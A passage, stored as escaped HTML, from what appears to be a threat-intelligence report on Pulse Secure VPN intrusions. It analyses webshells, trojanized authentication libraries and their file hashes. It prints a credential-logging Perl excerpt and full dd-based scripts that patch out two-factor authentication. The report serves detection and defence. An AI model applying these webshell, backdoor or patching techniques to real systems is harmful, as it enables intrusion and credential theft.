class=\u0022code\u0022\u003E705cda7d1ace8f4adeec5502aa311620b8d6c64046a1aed2ae833e2f2835154f\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EExecute sed on PulseSecure system files\u003C\/li\u003E\n\u003Cli\u003ERemounts filesystem as writable: \u003Cspan class=\u0022code\u0022\u003Esystem(\u0026quot;\/bin\/mount -o remount,rw \/dev\/root \/\u0026quot;)\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EUnexpected execution of other system commands such as \u003Cspan class=\u0022code\u0022\u003Etar\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003Ecp\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003Erm\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EMITRE ATT\u0026amp;CK Techniques\u003C\/h4\u003E\n\u003Cp\u003EThe following list of MITRE ATT\u0026amp;CK techniques cover all malware samples described in this report as well as those observed throughout the lifecycle of UNC2630 and UNC2717.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ET1003-OS Credential Dumping\u003C\/li\u003E\n\u003Cli\u003ET1016-System Network Configuration Discovery\u003C\/li\u003E\n\u003Cli\u003ET1021.001-Remote Desktop Protocol\u003C\/li\u003E\n\u003Cli\u003ET1027-Obfuscated Files or Information\u003C\/li\u003E\n\u003Cli\u003ET1036.005-Match Legitimate Name or Location\u003C\/li\u003E\n\u003Cli\u003ET1048-Exfiltration Over Alternative Protocol\u003C\/li\u003E\n\u003Cli\u003ET1049-System Network Connections Discovery\u003C\/li\u003E\n\u003Cli\u003ET1053-Scheduled Task\/Job\u003C\/li\u003E\n\u003Cli\u003ET1057-Process Discovery\u003C\/li\u003E\n\u003Cli\u003ET1059-Command and Scripting Interpreter\u003C\/li\u003E\n\u003Cli\u003ET1059.003-Windows Command Shell\u003C\/li\u003E\n\u003Cli\u003ET1070-Indicator Removal on Host\u003C\/li\u003E\n\u003Cli\u003ET1070.001-Clear Windows Event Logs\u003C\/li\u003E\n\u003Cli\u003ET1070.004-File Deletion\u003C\/li\u003E\n\u003Cli\u003ET1071.001-Web Protocols\u003C\/li\u003E\n\u003Cli\u003ET1082-System Information Discovery\u003C\/li\u003E\n\u003Cli\u003ET1098-Account Manipulation\u003C\/li\u003E\n\u003Cli\u003ET1105-Ingress Tool Transfer\u003C\/li\u003E\n\u003Cli\u003ET1111-Two-Factor Authentication Interception\u003C\/li\u003E\n\u003Cli\u003ET1133-External Remote Services\u003C\/li\u003E\n\u003Cli\u003ET1134.001 Access Token Manipulation: Token Impersonation\/Theft\u003C\/li\u003E\n\u003Cli\u003ET1136-Create Account\u003C\/li\u003E\n\u003Cli\u003ET1140-Deobfuscate\/Decode Files or Information\u003C\/li\u003E\n\u003Cli\u003ET1190-Exploit Public-Facing Application\u003C\/li\u003E\n\u003Cli\u003ET1505.003-Web Shell\u003C\/li\u003E\n\u003Cli\u003ET1518-Software Discovery\u003C\/li\u003E\n\u003Cli\u003ET1554-Compromise Client Software Binary\u003C\/li\u003E\n\u003Cli\u003ET1556.004-Network Device Authentication\u003C\/li\u003E\n\u003Cli\u003ET1592.004 Gather Victim Host Information: Client Configurations\u003C\/li\u003E\n\u003Cli\u003ET1562 Impair Defenses\u003C\/li\u003E\n\u003Cli\u003ET1569.002-Service Execution\u003C\/li\u003E\n\u003Cli\u003ET1574 Hijack Execution Flow\u0026nbsp;\u003C\/li\u003E\n\u003Cli\u003ET1600-Weaken Encryption\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig6.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: MITRE ATT\u0026amp;CK Map\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003ETechnical Annex\u003C\/h4\u003E\n\u003Ch5\u003ESLIGHTPULSE\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Emeeting_testjs.cgi\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a\u003C\/span\u003E) is a webshell capable of arbitrary file read, write, and command execution. Malicious logic is inserted at the end of legitimate logic to respond to POST requests. We believe this webshell may be responsible for placing additional webshells and used to modify legitimate system components resulting in the other observed malware families due to its functionality.\u003C\/p\u003E\n\u003Cp\u003EThe malicious logic inserts a branch condition to respond to HTTP POST requests rather than just the typical GET requests expected of the legitimate code. If GET requests are performed the legitimate logic is still invoked. POST requests have a series of parameters checked for existence to determine which command to invoke. This logic is:\u003C\/p\u003E\n\u003Ctable border=\u00220\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022309\u0022\u003E\u003Cp\u003E\u003Cb\u003EPOST params\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022273\u0022\u003E\u003Cp\u003E\u003Cb\u003EInvoked Command\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022309\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ecert\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022273\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ewritefile\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022309\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eimg, name with nonempty value\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022273\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereadfile\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022309\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eimg set to empty string \u0026quot;\u0026quot;, name\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022273\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eexeccmd\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022309\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eanything else\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022273\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Einvoke original legitimate logic\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig7.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: Webshells respond to POSTs\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAll incoming and outgoing requests are base64 encoded\/decoded and RC4 encrypted\/decrypted. The scheme is simple. The first six characters of the data are a random key generated per request as a sort of nonce, with the static RC4 key appended. This nonce + phrase together act as the RC4 key. The phrase is not sent over the wire, only the nonce. This entire key is then used to encrypt\/decrypt payload data that immediately follows the key. The form of data on the wire is:\u003C\/p\u003E\n\u003Cp\u003EOutbound\/Inbound:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;6randbytes\u0026gt;\u0026lt;encrypted_data\u0026gt;\u003Cbr\u003E\n ^-RC4NONCE-^\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUsage:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;6randbytes\u0026gt;\u0026lt;rc4_phrase\u0026gt;\u0026lt;encrypted_data\u0026gt;\u003Cbr\u003E\n ^-------RC4 KEY--------^\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003EReadFile\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThis command accepts a base64 encoded, RC4 encrypted file name via the \u003Cspan class=\u0022code\u0022\u003Eimg\u003C\/span\u003E parameter and opens it for read. The file contents are read in full then sent back to the attacker as base64 encoded, RC4 encrypted data with the headers \u003Cspan class=\u0022code\u0022\u003E\u0026quot;Content-type: application\/x-download\\n\u0026quot;\u003C\/span\u003E, and form header \u003Cspan class=\u0022code\u0022\u003E\u0026quot;Content-Disposition: attachment; filename=tmp\\n\\n\u0026quot;\u003C\/span\u003E.\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003EWriteFile\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThis command accepts a base64 encoded, RC4 encrypted filename via the \u003Cspan class=\u0022code\u0022\u003Ecert\u003C\/span\u003E parameter, and base64 encoded, RC4 encrypted file data via the parameter \u003Cspan class=\u0022code\u0022\u003Emd5\u003C\/span\u003E. The filename is opened in write mode with the file data being written to the file before the file is closed. The results of this command are sent back to the attacker, using the headers \u003Cspan class=\u0022code\u0022\u003E\u0026quot;Cache-Control: no-cache\\n\u0026quot;\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003E\u0026quot;Content-type: text\/html\\n\\n\u0026quot;\u003C\/span\u003E.\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003EExecute\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThis command accepts a base64 encoded, RC4 encrypted commands via the \u003Cspan class=\u0022code\u0022\u003Ename\u003C\/span\u003E parameter. The malicious logic forbids the \u003Cspan class=\u0022code\u0022\u003Ecd\u003C\/span\u003E command and will respond with the text \u003Cspan class=\u0022code\u0022\u003EError 404\u003C\/span\u003E if executed. All other commands will be executed via the \u003Cspan class=\u0022code\u0022\u003Esystem\u003C\/span\u003E API with output piped to the file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/1\u003C\/span\u003E. The full system command is \u003Cspan class=\u0022code\u0022\u003E\u0026lt;command\u0026gt; \u0026gt;\/tmp\/1 2\u0026gt;\u0026amp;1\u003C\/span\u003E. The output of this execution is read and sent back to the attacker base64 encoded, RC4 encrypted. The headers \u003Cspan class=\u0022code\u0022\u003E\u0026quot;Cache-Control: no-cache\\n\u0026quot;\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003E\u0026quot;Content-type: image\/gif\\n\\n\u0026quot;\u003C\/span\u003E are used. The response appears to be masquerading as a GIF when sending back this command output.\u003C\/p\u003E\n\u003Ch5\u003ERADIALPULSE\u003Ci\u003E\u003C\/i\u003E\u003C\/h5\u003E\n\u003Cp\u003EThe file with the SHA256 hash \u003Cspan class=\u0022code\u0022\u003Ed72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b\u003C\/span\u003E is a modified Perl script associated with a PulseSecure web-based tool which causes usernames, passwords and information associated with logins to this application to be written to the file \u003Cspan class=\u0022code\u0022\u003E\/tmp\/dsstartssh.statementcounters\u003C\/span\u003E.\u003C\/p\u003E\n\u003Cp\u003ERetrieval of these login credentials must be achieved through other means such as an interactive login or a webshell. Persistence is achieved by the addition of compromised code which is continually served when requesting this PulseSecure webpage.\u003C\/p\u003E\n\u003Cp\u003EAn excerpt of the code related to credential stealing is shown as follows:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Emy $realmName1 = $signin-\u0026gt;getRealmInfo()-\u0026gt;{name};\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eopen(*fd, \u0026quot;\u0026gt;\u0026gt;\/tmp\/dsstartssh.statementcounters\u0026quot;);\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esyswrite(*fd, \u0026quot;realm=$realmName1 \u0026quot;, 5000); \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; \u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esyswrite(*fd, \u0026quot;username=$username \u0026quot;, 5000); \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; \u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esyswrite(*fd, \u0026quot;password=$password\\n\u0026quot;, 5000);\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eclose(*fd);\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 1\u003Ci\u003E\u003C\/i\u003E\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E with SHA256 \u003Cspan class=\u0022code\u0022\u003Ecd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68\u003C\/span\u003E is a trojanized ELF shared object belonging to the PulseSecure VPN server. The sample has been modified to bypass specific authentication mechanisms of the LDAP and RADIUS protocols. The sample hardcodes a backdoor key that will silently subvert auth failures if the correct backdoor key is passed, establishing a VPN connection as if auth succeeded. If the backdoor password is not used, authentication will fail as normal.\u003C\/p\u003E\n\u003Cp\u003EIn multiple locations assembly is written into the padding regions between legitimate functions. As these regions are very small, around 20 bytes, the malicious logic stitches itself together by unconditionally jumping between multiple padding regions. The assembly is written in a way very similar to mid-function hooks, where it is common to push and then pop all flags and registers before and after the injected logic. By preserving registers and flags in this way the malicious logic is able to execute and perform its malicious logic as a passive observer if desired, only effecting the control flow in specific conditions. This is employed in two locations, the LDAP and RADIUS authentication routines, \u003Cspan class=\u0022code\u0022\u003EDSAuth::LDAPAuthServer::authenticate\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003EDSAuth::RadiusAuthServer::checkUsernamePassword\u003C\/span\u003E respectively.\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ELDAP Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EIn the typical execution of \u003Cspan class=\u0022code\u0022\u003EDSAuth::LDAPAuthServer::authenticate\u003C\/span\u003E the legitimate application constructs the C++ object \u003Cspan class=\u0022code\u0022\u003EDSAuth::LDAPAuthServer::ldap\u003C\/span\u003E then passes it to \u003Cspan class=\u0022code\u0022\u003EDSLdapServer::bind\u003C\/span\u003E with the username and password for login. This bind may fail or succeed which determines the authentication failure or success of the LDAP protocol. The malicious logic inserted into the application redirects execution before \u003Cspan class=\u0022code\u0022\u003EDSLdapServer::bind\u003C\/span\u003E just after the ldap object is constructed. At this point in execution the username and password are easily extracted from memory with mid-function hooking techniques, which the sample copies to a code cave in memory between two functions as a temporary storage location. The malicious logic then invokes \u003Cspan class=\u0022code\u0022\u003EDSLdapServer::bind\u003C\/span\u003E as the normal logic would, which sets the return register EAX to 0 or 1 for failure or success. A check is then executed where the temporary password copy made earlier is checked against a hardcoded backdoor password. If this check passes the backdoor logic actives by overwriting EAX to 1 to force the application down the execution path of successful authentication, even though in reality authentication failed.\u003C\/p\u003E\n\u003Ch5\u003ERADIUS Two Factor Auth Bypass\u003C\/h5\u003E\n\u003Cp\u003EIn the typical execution of \u003Cspan class=\u0022code\u0022\u003EDSAuth::RadiusAuthServer::checkUsernamePassword\u003C\/span\u003E the legitimate application sends a RADIUS-2FA auth packet with username and password via \u003Cspan class=\u0022code\u0022\u003ERadiusAuthPacket::sendRadiusPacket\u003C\/span\u003E. The response is then retrieved and parsed by the routine \u003Cspan class=\u0022code\u0022\u003EDSAuth::RadiusAuthServer::handleResponse\u003C\/span\u003E. After packet retrieval the packet type is verified to be 3, it\u0027s not known what this packet type specifies but this is the packet type of a successful authentication response. If the packet type check passes, then the sample reads a field of the packet that specifies if authentication was successful or not and then checks this status later. The inserted malicious logic hijacks execution just after \u003Cspan class=\u0022code\u0022\u003EDSAuth::RadiusAuthServer::handleResponse\u003C\/span\u003E where the password sent to the RADIUS server is checked against a backdoor password. If this check passes the malicious logic overwrites the retrieved packet with values indicating that it\u0027s of type 3 and that authentication was successful. The malicious logic then rejoins the original execution flow where the packet type is checked. If written the spoofed values force the application down the execution path of successful authentication, even though in reality authentication failed.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 2\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EACE Two Factor Auth Credential Logging\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EWe also identified a variant of SLOWPULSE (SHA256: \u003Cspan class=\u0022code\u0022\u003E1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd\u003C\/span\u003E) which logs credentials used during ACE-2FA protocol authentication.\u003C\/p\u003E\n\u003Cp\u003EThe backdoor is implemented in the routine \u003Cspan class=\u0022code\u0022\u003EDSAuth::AceAuthServer::checkUsernamePassword\u003C\/span\u003E. As part of the login procedure the username and password are retrieved then written into a map entry structure. The backdoor inserts an unconditional jump into the logon logic that takes this map entry structure, reads the username and password fields, then writes them to the file \u003Cspan class=\u0022code\u0022\u003E\/home\/perl\/PAUS.pm\u003C\/span\u003E in \u003Cspan class=\u0022code\u0022\u003Ea+\u003C\/span\u003E (append) mode, using the format string \u003Cspan class=\u0022code\u0022\u003E%s:%s\\n\u003C\/span\u003E. The backdoor then unconditionally jumps back into the normal control flow to continue the logon process as normal.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 3\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EACE Two Factor Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EWe Identified another variant of SLOWPULSE (SHA256: \u003Cspan class=\u0022code\u0022\u003Eb1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9\u003C\/span\u003E) which is similar to SLOWPULSE VARIANT 2 the malicious logic lives within \u003Cspan class=\u0022code\u0022\u003EDSAuth::AceAuthServer::checkUsernamePassword\u003C\/span\u003E, however this variant bypasses the logon procedure rather than login credentials. Typical execution of this routine calls \u003Cspan class=\u0022code\u0022\u003EDsSecID_checkLogin\u003C\/span\u003E to validate the username and password which sets the EAX register to 1. The routine \u003Cspan class=\u0022code\u0022\u003EDSAuth::AceAuthServer::handleACEAuthResult\u003C\/span\u003E then checks EAX to determine if auth was successful or not. The malicious logic hijacks execution immediately after the username and password fields are written to their map entries, then checks if the password matches the backdoor password. If the password matches, then the EAX register is overwritten to 1. This puts the program in the same state as if \u003Cspan class=\u0022code\u0022\u003EDsSecID_checkLogin\u003C\/span\u003E had successfully executed, but unlike SLOWPULSE VARIANT 1 the original authentication routine is not called at all. The malicious logic then rejoins execution before \u003Cspan class=\u0022code\u0022\u003EDSAuth::AceAuthServer::handleACEAuthResult\u003C\/span\u003E which will now pass. This forces the application down the execution path of successful authentication, even though in reality authentication would have failed.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 4\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003ERealmSignin Two Factor Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EWe identified a fourth variant of SLOWPULSE responsible for bypassing what may be the two-factor authentication step of the \u003Cspan class=\u0022code\u0022\u003EDSAuth::RealmSignin\u003C\/span\u003E process. The backdoor is present within the function \u003Cspan class=\u0022code\u0022\u003EDSAuth::RealmSignin::runSigninStep\u003C\/span\u003E.This routine is responsible for multiple steps of the login procedure and is implemented as a large switch statement. Case 11 of the switch statement typically calls the routines \u003Cspan class=\u0022code\u0022\u003EDSMap::setPrivacyKeyNames\u003C\/span\u003E then \u003Cspan class=\u0022code\u0022\u003EDSAuth::RealmSignin::runSecondaryAuth\u003C\/span\u003E. The malicious logic in this variant overwrites the call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces application flow as if DSAuth::RealmSignin::runSecondaryAuth always succeeds, without ever calling it. We were not able to recover a file with these patches applied as the attacker removed their patches after use. However, we did uncover both the patcher and unpatcher utilities. We do not provide a hash for this file as we have not recovered it from a system in the field. This analysis was performed by replaying the changes performed by the patcher we did recover.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 2 Patcher\u003C\/h5\u003E\n\u003Cp\u003EAs part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E file. The file with SHA256: \u003Cspan class=\u0022code\u0022\u003Ec9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c\u003C\/span\u003E is responsible for inserting SLOWPULSE V2 malicious logic to log ACE credentials. The patcher accepts two command line arguments, the path to the original binary and the patched output file path. The original binary is read into memory, patched, and then written to the output path. The assembly patches and offsets into the original binary are hardcoded.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 3 Patcher\u003C\/h5\u003E\n\u003Cp\u003E\u0026nbsp;As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E file. The file with SHA256: \u003Cspan class=\u0022code\u0022\u003E06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7\u003C\/span\u003E is responsible for inserting SLOWPULSE V3 malicious logic to bypass ACE logon authentication process. The patcher accepts four arguments. The first argument is the original binary path, the second the patched output file path, third is the backdoor bypass password, and fourth is the letter e specifying to apply patches. The sample reads the original binary into memory, applies the assembly patches associated with SLOWPULSE V3, as well as the provided bypass password, then written to the output path. The assembly patches, and all offsets including where to copy the bypass password are hardcoded.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 4 Patcher\u003C\/h5\u003E\n\u003Cp\u003EAs part of our investigation into the SLOWPULSE family we recovered the utility the attacker used to insert the malicious logic into the original \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E file. The file with SHA256: \u003Cspan class=\u0022code\u0022\u003Ee63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415\u003C\/span\u003E responsible for inserting the patch for SLOWPULSE V3. The patch applied overwrites a single call to \u003Cspan class=\u0022code\u0022\u003EDSAuth::RealmSignin::runSecondaryAuth\u003C\/span\u003E with \u003Cspan class=\u0022code\u0022\u003Emov eax, 1\u003C\/span\u003E. This patcher utility is a simple bash script, unlike the previous patchers which were compiled applications likely written in C. The script in full is:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eprintf \u0027\\xB8\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))\u003Cbr\u003E\n printf \u0027\\x01\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32))\u003Cbr\u003E\n printf \u0027\\x00\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))\u003Cbr\u003E\n printf \u0027\\x00\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34))\u003Cbr\u003E\n printf \u0027\\x00\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 4 UnPatcher\u003C\/h5\u003E\n\u003Cp\u003EAs part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to remove the malicious logic into the original \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E file for SLOWPULSE V4. The attacker chose to remove the patches applied to \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E. The file with SHA256:\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003Eb2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a\u003C\/span\u003E is the unpatcher utility for SLOWPULSE V4. This sample is also a simple bash script, in full it is:\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eprintf \u0027\\xE8\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))\u003Cbr\u003E\n printf \u0027\\xE2\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32))\u003Cbr\u003E\n printf \u0027\\x08\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))\u003Cbr\u003E\n printf \u0027\\xD0\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34))\u003Cbr\u003E\n printf \u0027\\xFF\u0027 | dd conv=notrunc of=\/home\/lib\/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ESTEADYPULSE\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Elicenseserverproto.cgi\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003E168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc\u003C\/span\u003E) is a webshell implemented via modification of a legitimate Perl script used by a Pulse Secure tool which enables arbitrary command execution.\u003C\/p\u003E\n\u003Cp\u003EThe attacker inserted two blocks of Perl code that implement the webshell. The source code modifications are surrounded by comments that indicate the start and end of inserted code. The comment strings used are \u003Cspan class=\u0022code\u0022\u003E##cgistart1\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003E##cgiend1\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003E##cgistart2\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003E##cgiend2\u003C\/span\u003E. Although the exact purpose of these comment strings is unknown, the attacker may use them to facilitate updates to the malicious code or to allow for its quick removal if necessary.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe Perl script enclosed in the tags \u003Cspan class=\u0022code\u0022\u003E##cgistart1\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003E##cgiend1\u003C\/span\u003E adds several lines to import Perl modules that are used by the webshell. It also adds a function to parse parameters of received command data.\u003C\/li\u003E\n\u003Cli\u003EThe script enclosed in the tags \u003Cspan class=\u0022code\u0022\u003E##cgistart2\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003E##cgiend2\u003C\/span\u003E is responsible for checking web requests designed to be executed by the webshell, if present. If no webshell request is found, the script passes execution to the legitimate Perl script for the webpage.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThe webshell portion of the script is invoked when it receives a form submission \u003Cspan class=\u0022code\u0022\u003Ename=value\u003C\/span\u003E pair of \u003Cspan class=\u0022code\u0022\u003Eserverid\u003C\/span\u003E matching a secret key. This causes the webshell to extract the string passed to it via the \u003Cspan class=\u0022code\u0022\u003EQUERY_STRING\u003C\/span\u003E CGI environment variable. Individual key\/value pairs delimited by the \u003Cspan class=\u0022code\u0022\u003E\u0026amp;\u003C\/span\u003E character and are URL decoded. Although the script parses out all key\/value pairs it receives, it specifically looks for and extracts data associated with the cmd parameter. If found, it will generate a form containing the extracted cmd to be executed and the previous \u003Cspan class=\u0022code\u0022\u003Eserverid\u003C\/span\u003E value along with a form submission button named \u003Cspan class=\u0022code\u0022\u003ERun\u003C\/span\u003E. Upon submission, the webshell will execute the passed command on the victim host\u0027s command line and display the results to the attacker before exiting. If no cmd value was extracted, the webshell will simply output a \u003Cspan class=\u0022code\u0022\u003E\u0026lt;\/pre\u0026gt;\u003C\/span\u003E HTML tag.\u003C\/p\u003E\n\u003Ch5\u003EPULSECHECK\u003Ci\u003E\u003C\/i\u003E\u003C\/h5\u003E\n\u003Cp\u003EThe file \u003Cspan class=\u0022code\u0022\u003Esecid_canceltoken.cgi\u003C\/span\u003E (SHA256: \u003Cspan class=\u0022code\u0022\u003Ea1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1\u003C\/span\u003E) is a webshell written in Perl that enables arbitrary command execution. With a properly formatted request, the script will execute webshell code. Otherwise, the legitimate welcome page of the Pulse Secure VPN software is presumably invoked.\u003C\/p\u003E\n\u003Cp\u003EThe script checks for web requests using the HTTP\u0026nbsp;POST\u0026nbsp;method and, if found, will further check the HTTP request headers for the CGI environment variable\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003EHTTP_X_KEY\u003C\/span\u003E. If this header matches a backdoor key, then the malware will output the result of the command sent in the variable\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003EHTTP_X_CMD\u003C\/span\u003E. This data is RC4 encrypted and base64-encoded. The passphrase to decrypt is sent in the environment variable\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003EHTTP_X_CNT\u003C\/span\u003E. The webshell will set the content type to\u0026nbsp;\u003Cspan 